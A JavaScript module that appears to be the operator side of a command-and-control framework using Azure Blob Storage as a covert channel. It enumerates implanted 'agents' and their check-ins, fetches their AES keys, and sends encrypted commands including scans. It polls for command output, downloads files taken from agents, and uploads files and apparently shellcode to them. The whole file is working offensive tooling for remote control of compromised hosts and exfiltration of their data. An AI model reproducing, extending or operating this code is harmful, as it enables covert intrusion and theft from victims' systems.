const { BlobServiceClient } = require('@azure/storage-blob');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const fs = require('fs'); // Use synchronous fs module for createWriteStream
const fsp = require('fs').promises;
const { log } = require('console');
const { getAppDataDir } = require('./common');
const directories       = getAppDataDir();
const logFile = path.join(directories.downloadsDir, 'azure.js.log');
let config = require(directories.configFilePath);


// const StorageAccount = config.storageAccount;
// const sasToken = config.sasToken;
// const blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

function logToFile(message) 
{
    const timestamp = new Date().toISOString();
    fs.appendFileSync(logFile, `[${timestamp}] ${message}\n`);
}

function clearLogFile()
{
  // Open the file in write mode and truncate it
  fs.writeFile(logFile, '', (err) => {
    if (err) {
      console.error(`Error clearing log file: ${err.message}`);
    } else {
      console.log(`Log file at ${logFile} has been cleared.`);
    }
  });
}

// Function to decode a base64 string
function decodeBase64(base64) {
  // Create a buffer from the base64 encoded string
  const buffer = Buffer.from(base64, 'base64');
  // Convert the buffer to a utf-8 string
  const decoded = buffer.toString('utf-8');
  return decoded;
}
// Function to encode a string to base64
function encodeBase64(input) {
  // Create a buffer from the input string
  const buffer = Buffer.from(input, 'utf-8');
  // Convert the buffer to a base64 encoded string
  const base64 = buffer.toString('base64');
  return base64;
}
// Function to AES encrypt data with a static key and IV
async function aesEncrypt(data,key,iv) {
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

  let encrypted = "";
  if ( Buffer.isBuffer( data ) ) {
    encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  }
  else { 
    encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
  }
  return encrypted;
}
// Function to AES decrypt data with a static key and IV
async function aesDecrypt(encryptedData, key, iv) {
  // const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  // let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
  // decrypted += decipher.final('utf8');
  // return decrypted;
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  
  let decrypted = "";
  if ( Buffer.isBuffer( encryptedData ) ) {
    decrypted = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
  }
  else { 
    decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
  }
  return decrypted;
}
async function DeleteStorageContainer(StorageContainer,config)
{
  let StorageAccount = config.storageAccount;
  let sasToken = config.sasToken;
  let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

    let options = {
      hostname: StorageAccount,
      port: 443,
      path: `/${StorageContainer}?restype=container&${sasToken}`,
      method: 'DELETE',
      headers: {
        'x-ms-version': '2020-04-08', // The version of the Azure Blob Storage API to use
        'x-ms-date': new Date().toUTCString() // The current date and time in UTC format
      }
    };
    //common.logToFile('HTTP request options :',options);
    
    return await makeRequest(options);
}
async function DeleteStorageBlob(StorageContainer,StorageBlob,config)
{
  let StorageAccount = config.storageAccount;
  let sasToken = config.sasToken;
  let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  //log(`DeleteStorageBlob() : path : /${StorageContainer}/${StorageBlob}?${sasToken}`);

    let options = {
      hostname: StorageAccount,
      port: 443,
      path: `/${StorageContainer}/${StorageBlob}?${sasToken}`,
      method: 'DELETE',
      headers: {
        'x-ms-version': '2020-04-08', // The version of the Azure Blob Storage API to use
      }
    };
    
    return await makeRequest(options);
}
async function preloadContainers(metaContainer,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);
 let meta_agent_container_info = [];
  try {
        //console.log(`Listing Agent blobs in metaContainer: ${metaContainer}`);

        const containerClient = blobServiceClient.getContainerClient(metaContainer);
        let i = 1;
        for await (const blob of containerClient.listBlobsFlat()) {
            try
            {
              let agent_blob = blob.name;
              //console.log(`Agent Blob ${i++}: ${agent_blob}`);
              let agent_container = await readBlob(metaContainer,agent_blob,config);
              if(agent_container.statusCode == 200)
              {
                let this_agent_info = {
                  'agentid':agent_blob,
                  'containerid':agent_container['data']
                }
                  meta_agent_container_info.push(this_agent_info);
              }
            }catch(error)
            {
              console.log(`Failed to get agent container ${error.stack}`);
            }
        }
        //console.log(`metablobs : ${JSON.stringify(metablobs)}`);
        return JSON.stringify(meta_agent_container_info);
    } catch (error) {
        //console.error(`Error listing blobs in meta container: ${error.message} ${error.stack}`);
        //return metablobs;
        //return JSON.stringify(meta_agent_container_info);
        return null;
    }
}
async function listBlobsInContainer(containerName,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  let metablobs = {};
  let agentcheckins = [];
    try {
        //console.log(`Listing blobs in container: ${containerName}`);

        const containerClient = blobServiceClient.getContainerClient(containerName);
        let i = 1;
        for await (const blob of containerClient.listBlobsFlat()) {
            try
            {
              //console.log(`Blob ${i++}: ${blob.name}`);
              let blobresp = await readBlob(containerName,blob.name,config);
              //log(`[${i}] ${blob.name} : ${blobresp.data}`);
              i++;
              if(blobresp.statusCode == 200)
              {
                let agent_container_id = blobresp.data;
                let this_agent_blobs   = await getContainerBlobs(agent_container_id,config);
                if (this_agent_blobs)
                {
                  //console.log(`${agent_container_id} container key blob : ${this_agent_blobs['key']}`);
                  let this_agent_key      = await getContainerAesKeys(agent_container_id,this_agent_blobs['key'],config);
                  let checkinData         = await checkinContainer(agent_container_id, this_agent_key, this_agent_blobs,config);
                  let agentObj = JSON.parse(checkinData);
                  agentObj.agentid     = blob.name;
                  agentObj.containerid = agent_container_id;
                  let inputcheckinblob = await readBlob(agent_container_id,this_agent_blobs['in'],config );
                  const numberValue   = Number(inputcheckinblob.data);
                  //console.log(`${this_agent_blobs['in']} Input channel response : ${inputcheckinblob.data}  | timestamp : ${numberValue}`);
                  if (!isNaN(numberValue)) 
                  {
                    agentObj.checkIn = numberValue;
                  }else
                  {
                    agentcheckin.input_checkin = Date.now()-2000; // getting update timestamp from input channel. So if we poll the channel while input is in pipe it gives NaN
                  }
                  //checkinObj[blob.name]   = agent_container_id;
                  //let agent_checkin      = JSON.parse(checkinContainer(agent_container_id, this_agent_key, this_agent_blobs));
                  //console.log(JSON.stringify(agentObj));
                  agentcheckins.push(agentObj);
                }else
                {
                  // console.log(`Error : ${blob.name} did not exist. Deleting.`);
                  // let deleteresp = await DeleteStorageBlob(containerName,blob.name,config);
                  //console.log(`Delete response : ${deleteresp.statusCode} .`);
                }
              }
            }catch(error)
            {
              //console.log(`Failed to get checkin from listed agent container ${error.stack}`);
            }
        }
        //console.log(`metablobs : ${JSON.stringify(metablobs)}`);
        return JSON.stringify(agentcheckins);
    } catch (error) {
        console.error(`Error listing blobs in container ${containerName}: ${error.message} ${error.stack}\n ${JSON.stringify(agentcheckins)}`);
        //return metablobs;
        return 0;
    }
}
async function returnAgentCheckinInfo(containerName,agentid,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  let agentcheckin;
  // console.log(`returnAgentCheckinInfo | containerName : ${containerName} & agentid : ${agentid}`);
    try {
        //console.log(`Listing blobs in container: ${containerName}`);

        const containerClient = blobServiceClient.getContainerClient(containerName);
        let i = 1;
        for await (const blob of containerClient.listBlobsFlat()) {
            //console.log(`Blob ${i++}: ${blob.name}`);
            if (blob.name == agentid)
            {
              // console.log(`Matched agentid ${agentid} to active blob ${containerName}/${blob.name}`);
              let blobresp = await readBlob(containerName,blob.name,config);
              let agent_container_id = blobresp.data;
              //console.log(`${blob.name} blob data : ${agent_container_id}`);
              let this_agent_blobs   = await getContainerBlobs(agent_container_id,config);
              //console.log(`${agent_container_id} container key blob : ${this_agent_blobs['key']}`);
              let this_agent_key      = await getContainerAesKeys(agent_container_id,this_agent_blobs['key'],config);
              let checkinData         = await checkinContainer(agent_container_id, this_agent_key, this_agent_blobs,config);

              // console.log(`checkin Data : ${checkinData}`);
              agentcheckin = JSON.parse(checkinData);
              //console.log(JSON.stringify(agentcheckin));
              let inputcheckinblob = await readBlob(agent_container_id,this_agent_blobs['in'],config );
              const numberValue   = Number(inputcheckinblob.data);
              //console.log(`${this_agent_blobs['in']} Input channel response : ${inputcheckinblob.data}  | timestamp : ${numberValue}`);
              if (!isNaN(numberValue)) 
              {
                agentcheckin.input_checkin = numberValue;
              }else
              {
                agentcheckin.input_checkin = Date.now()-2000; // getting update timestamp from input channel. So if we poll the channel while input is in pipe it gives NaN
              }
              agentcheckin.agentid     = blob.name;
              agentcheckin.containerid = agent_container_id;
              //checkinObj[blob.name]   = agent_container_id;
              //let agent_checkin      = JSON.parse(checkinContainer(agent_container_id, this_agent_key, this_agent_blobs));
              //console.log(JSON.stringify(agentcheckin));
            }
        }
        //console.log(`metablobs : ${JSON.stringify(metablobs)}`);
        return JSON.stringify(agentcheckin);
    } catch (error) {
        console.error(`returnAgentCheckinInfo() | Error listing blobs in container ${containerName}:`, error.message, error.stack);
    }
}
// Helper function to make an HTTPS request and return a Promise
function makeRequest(options, data = null) {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        resolve({ statusCode: res.statusCode, headers: res.headers, data: responseData });
      });
    });

    req.on('error', (e) => {
      reject(e);
    });

    if (data) {
      req.write(data);
    }

    req.end();
  });
}
async function UploadBlobToContainer(StorageContainer,StorageBlob,data,config)
{
  let StorageAccount = config.storageAccount;
  let sasToken = config.sasToken;
  let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  if ( data == null)
  {
    data = "";
  }
    const options = {
        hostname: StorageAccount,
        port: 443,
        path: `/${StorageContainer}/${StorageBlob}?${sasToken}`, // Path with SAS token and blob parameters
        method: 'PUT',
        headers: {
          'x-ms-version': '2020-02-10', // The version of the Azure Blob Storage API to use
          'x-ms-date': new Date().toUTCString(), // The current date and time in UTC format
          'x-ms-blob-type': 'BlockBlob', // Blob type
          'Content-Type': 'text/plain', // Set appropriate content type
          'Content-Length': Buffer.byteLength(data) // Length of the data
        }
    };

    return makeRequest(options,data);
    
}
// Function to read a blob's contents
async function readBlob(StorageContainer, StorageBlob, config) {
  try {
      let StorageAccount = config.storageAccount;
      let sasToken = config.sasToken;
      
      const options = {
          hostname: StorageAccount,
          port: 443,
          path: `/${StorageContainer}/${StorageBlob}?${sasToken}`,
          method: 'GET',
          headers: {
              'x-ms-version': '2020-02-10',
              'x-ms-date': new Date().toUTCString()
          }
      };

      const response = await makeRequest(options);

      // ✅ Ensure the response contains data and is not empty
      if (!response || response.length === 0 || response.statusCode === 404) {
          throw new Error(`Blob read failed: Empty response from ${StorageBlob}`);
      }

      return response; // Data is valid, return it
  } catch (error) {
      console.error(`Error reading blob ${StorageBlob}:`, error.message);
      return null; // Return null if an error occurs
  }
}
// async function readBlob(StorageContainer, StorageBlob,config)
// {
//     let StorageAccount = config.storageAccount;
//     let sasToken = config.sasToken;
//     let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

//   const options = {
//     hostname: StorageAccount,
//     port: 443,
//     path: `/${StorageContainer}/${StorageBlob}?${sasToken}`,
//     method: 'GET',
//     headers: {
//       'x-ms-version': '2020-02-10',
//       'x-ms-date': new Date().toUTCString()
//     }
//   };

//   return makeRequest(options);
// }
async function getContainerBlobs(containerName,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

    let inputBlob  = "";
    let outputBlob = "";
    try {
        // Find and read the "c-" blob
        const containerClient = blobServiceClient.getContainerClient(containerName);

        for await (const blob of containerClient.listBlobsFlat()) {
            if (blob.name.startsWith('i-')) {
                //console.log(`Found ${blob.name}`);
                inputBlob = blob.name;
            }
            if (blob.name.startsWith('o-')) {
               // console.log(`Found ${blob.name}`);
                outputBlob = blob.name;
            }
            if (blob.name.startsWith('c-')) {
               // console.log(`Found ${blob.name}`);
                checkinBlob = blob.name;
            }
            if (blob.name.startsWith('k-')) {
              //  console.log(`Found ${blob.name}`);
                keyBlob = blob.name;
            }
        } 
        const blobs = {
            'key'     : keyBlob,
            'checkin' : checkinBlob,
            'in'      : inputBlob,
            'out'     : outputBlob
        };
        return blobs;
    } catch (error) {
        //console.error(`Error connecting to container ${containerName}:`, error.message);
        return false;
    }
}
async function getContainerAesKeys(containerName,containerKeyBlob,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

    try {
        const containerClient = blobServiceClient.getContainerClient(containerName);

        let kBlobContent;
        // let cBlobContent;

        // Find and read the "k-" blob
        // for await (const blob of containerClient.listBlobsFlat()) {
        //     //console.log(`getContainerAesKeys() | blob.name : ${blob.name}`);
        //     logToFile(`getContainerAesKeys() | blob.name : ${blob.name}`);
        //     if (blob.name.startsWith('k-')) {
        //         //console.log(`Found k- blob: ${blob.name}`);
        //         const blockBlobClient = containerClient.getBlockBlobClient(blob.name);
        //         const downloadBlockBlobResponse = await blockBlobClient.download(0);
        //         kBlobContent = await streamToString(downloadBlockBlobResponse.readableStreamBody);
        //         break;
        //     }
        // }
        const blockBlobClient = containerClient.getBlockBlobClient(containerKeyBlob);
        const downloadBlockBlobResponse = await blockBlobClient.download(0);
        kBlobContent = await streamToString(downloadBlockBlobResponse.readableStreamBody);
        

        if (!kBlobContent) {
            logToFile('getContainerAesKeys() | No blob starting with "k-" found in the container.');
            return;
        }

        // Parse JSON values from the k- blob
        const kBlobJson = JSON.parse(kBlobContent);
        //console.log('JSON values from k- blob:', kBlobJson);
        const aes_key = kBlobJson['key']
        const aes_iv  = kBlobJson['iv']
        //console.log("AES Key :",aes_key);
        //console.log("AES IV  :",aes_iv );

        // Find and read the "c-" blob
        for await (const blob of containerClient.listBlobsFlat()) {
            if (blob.name.startsWith('i-')) {
                //console.log(`Found i- blob: ${blob.name}`);
                const blockBlobClient = containerClient.getBlockBlobClient(blob.name);
                const downloadBlockBlobResponse = await blockBlobClient.download(0);
                cBlobContent = await streamToString(downloadBlockBlobResponse.readableStreamBody);
                break;
            }
        }

        key = {
            'key':aes_key,
            'iv':aes_iv
        }
        //logToFile(`getContainerAesKeys() | \n\tkey.key : ${key.key}\n\tkey.iv : ${key.iv}`);
        return key;
    } catch (error) {
        logToFile(`getContainerAesKeys() | Error listing blobs in container ${containerName}:`, error.message);
    }
}
async function streamToString(readableStream) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        readableStream.on('data', (data) => {
            chunks.push(data.toString());
        });
        readableStream.on('end', () => {
            resolve(chunks.join(''));
        });
        readableStream.on('error', reject);
    });
}
async function checkinContainer(containerName, aes, blobs,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

    const aes_key_bytes = Buffer.from(aes['key'], 'hex');
    const aes_iv_bytes  = Buffer.from(aes['iv'],  'hex'); 
    //console.log(`checkin blob : ${blobs['checkin']}`);
    const containerClient = blobServiceClient.getContainerClient(containerName);

    try {

        const blockBlobClient = containerClient.getBlockBlobClient(blobs['checkin']);
        const downloadBlockBlobResponse = await blockBlobClient.download(0);
        let cBlobContent = await streamToString(downloadBlockBlobResponse.readableStreamBody);
        encrypted_b64_checkin = cBlobContent;
        //console.log("Encrypted B64 Checkin Data : ",encrypted_b64_checkin);
        encrypted_checkin = decodeBase64(encrypted_b64_checkin);
        //console.log("Encrypted Checkin Data     : ",encrypted_checkin);
        const decrypted_checkin = await aesDecrypt(encrypted_checkin,aes_key_bytes,aes_iv_bytes);
        //console.log(`${containerName} Checkin Data     : \r\n`,decrypted_checkin);
        if (!cBlobContent) {
            console.error('No checkin blob content found.');
            return;
        }else
        {
            return decrypted_checkin;
        }
    } catch (error) {
        console.error(`Error connecting to container ${containerName}:`, error.message);
    }
}
async function clearBlob(StorageContainer, StorageBlob,config) 
{
  let StorageAccount = config.storageAccount;
  let sasToken = config.sasToken;
  let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  const options = {
    hostname: StorageAccount,
    port: 443,
    path: `/${StorageContainer}/${StorageBlob}?${sasToken}`,
    method: 'PUT',
    headers: {
      'x-ms-version': '2020-02-10',
      'x-ms-date': new Date().toUTCString(),
      'x-ms-blob-type': 'BlockBlob',
      'Content-Type': 'text/plain',
      'Content-Length': 0 // Clearing the blob content
    }
  };

  return makeRequest(options);
}
async function uploadCommand(containerCmd,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  let containerCommand = JSON.parse(containerCmd);
  const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
  const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
  const inputblob   = containerCommand.blobs['in'];
  const outputblob  = containerCommand.blobs['out'];
  const containerName  = containerCommand.name;
  console.log(`${inputblob} ${outputblob} ${containerName}`);
  const encryptedData = await aesEncrypt(containerCommand.cmd,aes_key_bytes,aes_iv_bytes);
  //console.log(`[+] Encrypted data       : ${encryptedData}`);
  const b64EncData    = encodeBase64(encryptedData);
  // console.log(`[+] Encrypted b64 data   : ${b64EncData}`);
  let response = await UploadBlobToContainer(containerCommand.name,containerCommand.blobs['in'],b64EncData,config);
  // console.log(`command upload response status : ${response.status}`)
  let decrypted_out_data;
  //let waittime = 500;
  const startTime = Date.now();
  let currentTime;
  let elapsed;

  while(true)
  {
      let command_output = await readBlob(containerCommand.name,containerCommand.blobs['out'],config);
      if (command_output === null)
      {
        return null;
      }
      //log(`Read Blob Response : ${JSON.stringify(command_output)}`);
      // console.log(`Contents of ${outputblob} output blob  : ${command_output.data}`);
      if (command_output['data'])
      {
          let encrypted_out_data = decodeBase64(command_output['data']);
          //console.log("Encrypted Checkin Data     : ",encrypted_checkin);
          decrypted_out_data = await aesDecrypt(encrypted_out_data,aes_key_bytes,aes_iv_bytes);
          //console.log(decrypted_out_data);
          await clearBlob(containerName,outputblob,config);
          break;
      }
    //await new Promise(resolve => setTimeout(resolve, 200));
    currentTime = Date.now();
    elapsed = (currentTime - startTime)/1000;
    let waittime = 90;
    if (containerCommand.cmd.includes("scan "))
      {
      waittime = 300;
    }
    if(elapsed > waittime)
    {
      decrypted_out_data = "No response for command.";
      break;
    }
  }
  return decrypted_out_data;
}
async function pullDownloadFile(containerCmd,filename,blob,config)
{
  try{

    log(`azure.js | pullDownloadFile()`);
      let StorageAccount = config.storageAccount;
      let sasToken = config.sasToken;

    let containerCommand = JSON.parse(containerCmd);
    let baseFileName = path.basename(filename);
    // if (baseFileName.startsWith("'") && baseFileName.endsWith("'")) {
    //   baseFileName = baseFileName.slice(1, -1);
    // }
    // if (baseFileName.startsWith('"') && baseFileName.endsWith('"')) {
    //   baseFileName = baseFileName.slice(1, -1);
    // }
    // if (baseFileName.endsWith("'") || baseFileName.endsWith('"')) {
    //   return baseFileName.slice(0, -1);
    // }

    log(`pullDownloadFile() | filename     : ${filename}`);
    log(`pullDownloadFile() | blob         : ${blob}`);
    log(`pullDownloadFile() | command info : ${JSON.stringify(containerCommand)}`);
    const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
    const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
    let decrypted_out_data;
    let raw;

    // Ensure the directory exists
    if (!fs.existsSync(directories.downloadsDir)) {
        fs.mkdirSync(directories.downloadsDir, { recursive: true });
    }

    const destPath = path.join(directories.downloadsDir, baseFileName);

    // let destFilename = path.basename(filename);
    // let destPath = `./downloads/${destFilename}`;

    const url  = `https://${StorageAccount}/${containerCommand.name}/${blob}?${sasToken}`;
    log(`pullDownloadFile() | URL : ${url}`);
    let buffer;
    let index = 1;

  while(true)
  {
    //   let response = await readBlob(containerCommand.name,blob);
    //   //let command_output = await readBlob(containerCommand.name,blob);
    //   console.log(`[+] pullDownloadFile() | Check blob ${blob} for download file`);
    //   if (response.statusCode == 200)
    // {
      let response = await fetch(url);
      if (!response.ok) {
        log(`pullDownloadFile loop : ${index} | Failed to download file. Sleeping for 3 seconds and trying again. Status: ${response.status} ${response.statusText}`);
        await new Promise(resolve => setTimeout(resolve, 3000));
      }else
      {
        let arrayBuffer = await response.arrayBuffer();
        buffer = Buffer.from(arrayBuffer);
        break;
        //await fsp.writeFile(downloadPath, buffer);
        //log('File downloaded and saved successfully.');
      }
      index +=1;

      // console.log(`|__ Hit 200 response for download blob ${blob}`); 
      //   //let enc_b64_data        = Buffer.from(response.data);
      //   console.log(`|__ Encrypted b64 file : ${response.data}`);
      //   //let enc_data = decodeBase64(response.data);
      //   //let encryptedText = Buffer.from(response.data, 'hex');
      //   raw = response.data;

        //raw  = aesDecrypt( Buffer.from(encryptedText), aes_key_bytes, aes_iv_bytes );
        //let encrypted_out_data = decodeBase64(command_output['data']);
        //console.log("Encrypted Checkin Data     : ",encrypted_checkin);
        // decrypted_out_data = aesDecrypt(command_output['data'],aes_key_bytes,aes_iv_bytes);
        // await clearBlob(containerName,blob);
      // }
  }
  raw  = await aesDecrypt( buffer, aes_key_bytes, aes_iv_bytes );
  await fsp.writeFile(destPath, raw, (err) => {
    log(`Error writing file: ${err.stack}`);
  });
  log(`File ${destPath} has been saved.`);
  }catch(error)
  {
    log(`pullDownloadFile() Error: ${error} ${error.stack}`);
  }
}
async function uploadSCToAzure(containerCmd, StorageBlob, filePath,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  try {
    let containerCommand = JSON.parse(containerCmd);
    const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
    const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
    // Read the file content
    const fileContent = await fsp.readFile(filePath);
    const enc         = await aesEncrypt( fileContent, aes_key_bytes, aes_iv_bytes );
    const sasUrl = `https://${StorageAccount}/${containerCommand.name}/${StorageBlob}?${sasToken}`;
    const response = await fetch(sasUrl, {
      port: 443,
      method: 'PUT',
      headers: {
        'x-ms-blob-type': 'BlockBlob',
        'Content-Type': 'application/octet-stream' 
      },
      body: enc
    });
    log(`response ${response.ok}`);
  } catch (error) {
    output = `Error uploading file to azure : ${error.stack}`;
    log(`azure.js | uploadSCToAzure()\r\nError ${output}`);
  }
}
async function uploadFileToAzure(containerCmd, StorageBlob, filePath,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let blobServiceClient = new BlobServiceClient(`https://${StorageAccount}?${sasToken}`);

  try {
    let containerCommand = JSON.parse(containerCmd);
    const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
    const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
    // Read the file content
    const fileContent = await fsp.readFile(filePath);
    const enc         = await aesEncrypt( fileContent, aes_key_bytes, aes_iv_bytes );
    const sasUrl = `https://${StorageAccount}/${containerCommand.name}/${StorageBlob}?${sasToken}`;
    const response = await fetch(sasUrl, {

      //hostname: config['storageAccount'],
      port: 443,
      //path: `/${containerName}/${uploadblob}?${config['SASToken']}`,
      method: 'PUT',
      headers: {
        'x-ms-blob-type': 'BlockBlob',
        'Content-Type': 'application/octet-stream' 
      },
      body: enc
    });

  } catch (error) {
    output = `Error uploading file to azure : ${error.stack}`;
    log(`azure.js | uploadFileToAzure()\r\nError ${output}`);
    //common.logToFile( output );
  }
}
module.exports = {
    getContainerBlobs,
    preloadContainers,
    UploadBlobToContainer,
    readBlob,
    listBlobsInContainer,
    checkinContainer,
    getContainerAesKeys,
    uploadCommand,
    returnAgentCheckinInfo,
    uploadFileToAzure,
    uploadSCToAzure,
    pullDownloadFile,
    DeleteStorageContainer,
    DeleteStorageBlob
};